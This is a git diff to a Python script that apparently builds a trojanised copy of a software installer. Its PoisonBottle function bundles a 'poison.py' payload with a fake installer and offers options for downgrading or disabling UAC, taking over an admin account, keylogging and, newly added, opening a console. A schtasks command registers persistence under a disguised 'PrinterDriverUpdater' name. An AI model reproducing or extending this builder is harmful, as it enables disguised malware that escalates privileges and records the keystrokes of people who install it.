@@ -8,7 +8,7 @@ import poisonRecipe
 scheduler = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"
 
 #Create .exe identical to installer, but with fake elevation then execution stuff
-def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog): # TODO Forgot elevation request in poison
+def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog, OpenCMD): # TODO Forgot elevation request in poison
     poison = open("poison.py", 'w') #The file that will be bundled with fake installer
     recipe = open("poisonRecipe.py", 'r') #Base file for imports
 
@@ -35,7 +35,10 @@ def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog): # TODO 
         include += inspect.getsource(Log)
         main += "   Log()\n"
         include += "\n"
-    
+    if(OpenCMD == 1):
+        include += inspect.getsource(OpenConsole)
+        main += "   OpenConsole()\n"
+        include += "\n"
     poison.write(include)
 
     #__main__
@@ -77,4 +80,4 @@ def OpenConsole():
 #Drivers?
 
 if __name__ == "__main__":
-    PoisonBottle("C:/Users/lhill23/Documents/VEXcodeV5-20220228.exe", 1, 1, 1, 1)
+    PoisonBottle("C:/Users/lhill23/Documents/VEXcodeV5-20220228.exe", 1, 1, 1, 1, 1)
